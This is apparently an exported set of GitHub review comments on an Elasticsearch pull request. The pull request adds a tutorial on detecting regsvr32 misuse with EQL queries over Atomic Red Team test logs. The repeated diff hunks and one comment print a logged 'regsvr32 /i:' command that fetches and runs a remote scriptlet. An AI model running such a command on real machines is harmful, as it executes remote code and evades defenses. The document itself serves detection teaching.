"Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoxNzozMlrOHA0Nsg==", "hasNextPage": false, "hasPreviousPage": false}, "nodes": [{"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYxNzUyMg==", "bodyText": "Suggested change\n        \n          \n    \n\n        \n      \n    \n    \n      \n          \n            \n            these events. Append `and process.command_line > 0` to the previous EQL query.\n          \n          \n            \n            these events. Append `and process.command_line != null` to the previous EQL query.\n          \n      \n    \n    \n  \n\nI think it's also worth mentioning event.category, and by switching to process where ... you filter by category of process", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470617522", "createdAt": "2020-08-14T13:17:32Z", "author": {"login": "rw-access"}, "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.\n+\n+To narrow down the results, check if the command line was used during any of\n+these events. Append `and process.command_line > 0` to the previous EQL query.", "state": "SUBMITTED", "replyTo": null, "originalCommit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "originalPosition": 119}]}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDY3NTY4OTQw", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-467568940", "createdAt": "2020-08-14T13:21:32Z", "commit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "state": "COMMENTED", "comments": {"totalCount": 1, "pageInfo": {"startCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoyMTozM1rOHA0VkQ==", "endCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoyMTozM1rOHA0VkQ==", "hasNextPage": false, "hasPreviousPage": false}, "nodes": [{"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYxOTUzNw==", "bodyText": "I wouldn't say they are false positives, but more that they are superfluous. Like you know all the things that regsvr32.exe did -- it loaded some DLLs, dropped some files, made a network connection. But maybe it's better to show in this example that you want to know how regsvr32.exe was called in the first place. That's often the context you want to know when hunting -- where did this come from, and how?\nI think by articulating that goal, it makes it more clear why you want to look for the process creation event: it contains user.name, which says what user executed the process, as well as process.parent.name, so you know where it came from, and process.command_line, which gives you information of everything that regsvr32.exe was  told to do. That's why we end up valuing the process creation events so much.\nI think if you add those points, it'll add more punch/story and insight into the thought process to the example.", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470619537", "createdAt": "2020-08-14T13:21:33Z", "author": {"login": "rw-access"}, "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.", "state": "SUBMITTED", "replyTo": null, "originalCommit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "originalPosition": 116}]}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDY3NTcwMjI0", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-467570224", "createdAt": "2020-08-14T13:23:24Z", "commit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "state": "COMMENTED", "comments": {"totalCount": 1, "pageInfo": {"startCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoyMzoyNVrOHA0ZYw==", "endCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoyMzoyNVrOHA0ZYw==", "hasNextPage": false, "hasPreviousPage": false}, "nodes": [{"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYyMDUxNQ==", "bodyText": "This specific variant is called \"Squibblydoo.\" You don't have to include that name, but another pointer back to https://attack.mitre.org/techniques/T1218/010/ could be good here, if you want to \"read on for more information\"  about how this works.", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470620515", "createdAt": "2020-08-14T13:23:25Z", "author": {"login": "rw-access"}, "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.\n+\n+To narrow down the results, check if the command line was used during any of\n+these events. Append `and process.command_line > 0` to the previous EQL query.\n+This limits matching results to events that contain a `process.command_line`\n+value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\" and process.command_line > 0\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches one event. Based on the event's `process.command_line` value,\n+`regsvr32.exe` was used to register a script as `scrobj.dll`. This fits known\n+regsvr32 misuse behavior.", "state": "SUBMITTED", "replyTo": null, "originalCommit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "originalPosition": 140}]}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDY3NTcxMjA3", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-467571207", "createdAt": "2020-08-14T13:24:45Z", "commit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "state": "COMMENTED", "comments": {"totalCount": 1, "pageInfo": {"startCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoyNDo0NlrOHA0cQg==", "endCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoyNDo0NlrOHA0cQg==", "hasNextPage": false, "hasPreviousPage": false}, "nodes": [{"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYyMTI1MA==", "bodyText": "I'll have to have another look at this dataset. I think that event is mapped as file when it should be library. I'll see if I can update it for you, and come back to this example.", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470621250", "createdAt": "2020-08-14T13:24:46Z", "author": {"login": "rw-access"}, "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.\n+\n+To narrow down the results, check if the command line was used during any of\n+these events. Append `and process.command_line > 0` to the previous EQL query.\n+This limits matching results to events that contain a `process.command_line`\n+value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\" and process.command_line > 0\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches one event. Based on the event's `process.command_line` value,\n+`regsvr32.exe` was used to register a script as `scrobj.dll`. This fits known\n+regsvr32 misuse behavior.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 21,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"my-index-000001\",\n+        \"_id\": \"gl5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"parent\": {\n+              \"name\": \"cmd.exe\",\n+              \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010AA385401}\",\n+              \"executable\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n+            },\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"command_line\": \"regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\n+            \"ppid\": 2652\n+          },\n+          \"logon_id\": 217055,\n+          \"@timestamp\": 131883573237130000,\n+          \"event\": {\n+            \"category\": \"process\",\n+            \"type\": \"creation\"\n+          },\n+          \"user\": {\n+            \"full_name\": \"bob\",\n+            \"domain\": \"ART-DESKTOP\",\n+            \"id\": \"ART-DESKTOP\\\\bob\"\n+          }\n+        }\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 21/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"gl5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-check-for-malicious-script-loads]]\n+=== Check for malicious script loads\n+\n+You now know that `regsvr32.exe` was used to register\n+a potentially malicious script as `scrob.dll`. Next, find any processes that\n+later load the `scrob.dll` file.\n+\n+Modify the previous EQL query as follows:\n+\n+* Change the `any` keyword to `file`. This means the query only matches", "state": "SUBMITTED", "replyTo": null, "originalCommit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "originalPosition": 203}]}}, {"__typename": "PullRequestReview", "id": "MDE3OlB1bGxSZXF1ZXN0UmV2aWV3NDY3NTczNDQ2", "url": "https://github.com/elastic/elasticsearch/pull/59105#pullrequestreview-467573446", "createdAt": "2020-08-14T13:27:55Z", "commit": {"oid": "f31c960703c14de408a11b972445c80b1309683d"}, "state": "COMMENTED", "comments": {"totalCount": 1, "pageInfo": {"startCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoyNzo1NVrOHA0jDA==", "endCursor": "Y3Vyc29yOnYyOpK0MjAyMC0wOC0xNFQxMzoyNzo1NVrOHA0jDA==", "hasNextPage": false, "hasPreviousPage": false}, "nodes": [{"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYyMjk4OA==", "bodyText": "Could add a note that based off the command line we saw earlier (regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll) that we expect to find a match.\nOne reason why you might want to write a sequence here, is that it allows you to write the detection more generically and you don't have to overfit to the command line. The sequence looks for all the things that are suspicious, but they're also generic, so you're more likely to detect future variants as well.", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470622988", "createdAt": "2020-08-14T13:27:55Z", "author": {"login": "rw-access"}, "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.\n+\n+To narrow down the results, check if the command line was used during any of\n+these events. Append `and process.command_line > 0` to the previous EQL query.\n+This limits matching results to events that contain a `process.command_line`\n+value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\" and process.command_line > 0\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches one event. Based on the event's `process.command_line` value,\n+`regsvr32.exe` was used to register a script as `scrobj.dll`. This fits known\n+regsvr32 misuse behavior.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 21,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"my-index-000001\",\n+        \"_id\": \"gl5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"parent\": {\n+              \"name\": \"cmd.exe\",\n+              \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010AA385401}\",\n+              \"executable\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n+            },\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"command_line\": 